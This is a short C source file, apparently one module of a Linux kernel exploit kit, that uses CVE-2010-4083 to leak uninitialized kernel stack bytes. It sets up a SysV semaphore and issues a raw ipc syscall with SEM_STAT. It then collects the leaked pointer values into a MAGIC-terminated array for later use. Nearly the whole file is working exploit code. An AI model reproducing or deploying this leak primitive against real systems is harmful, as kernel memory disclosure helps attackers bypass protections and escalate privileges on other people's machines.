#include <stdio.h>
#include <linux/ipc.h>
#include <asm/sembuf.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <linux/sem.h>
#include <string.h>

#include "kstack.h"

int sem;

int setup()
{

	/* Create the semaphore we're going to use later */
	sem = semget(IPC_PRIVATE, 1, IPC_CREAT | 0x1ff);
	return sem;

}

/* This leverages CVE-2010-4083, an uninitialized structure member leak
 * in IPC.  As described, it returns a MAGIC terminated array of longs
 * containing the leaked bytes. */
unsigned long * leak_bytes()
{

	union semun arg;
	int ret;
	struct semid_ds out;
	unsigned long * bytes;

	bytes = malloc(5 * sizeof(long));

	memset(&out, 0, sizeof(out));
	memset(&arg, 0, sizeof(arg));

	arg.buf = &out;

	ret = syscall(117, SEMCTL, sem, 0, SEM_STAT, &arg);

	bytes[0] = (unsigned long)out.sem_base;
	bytes[1] = (unsigned long)out.sem_pending;
	bytes[2] = (unsigned long)out.sem_pending_last;
	bytes[3] = (unsigned long)out.undo;
	bytes[4] = MAGIC;

	return bytes; 
}
